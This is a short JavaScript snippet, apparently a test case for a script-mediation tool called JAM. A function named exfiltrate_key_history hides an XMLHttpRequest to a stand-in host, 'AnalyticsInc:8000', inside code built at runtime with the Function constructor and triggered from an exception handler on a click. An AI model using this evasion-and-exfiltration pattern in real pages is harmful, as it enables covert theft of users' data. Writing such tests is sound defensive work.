function exfiltrate_key_history() {
  try {
    window.NotExistingFunction()
  }catch(e$$4) {
    var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error2", true);xmlhttp.send(null);';
    var tmpFunc = JAM.new(Function, [exp]);
    tmpFunc()
  }
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
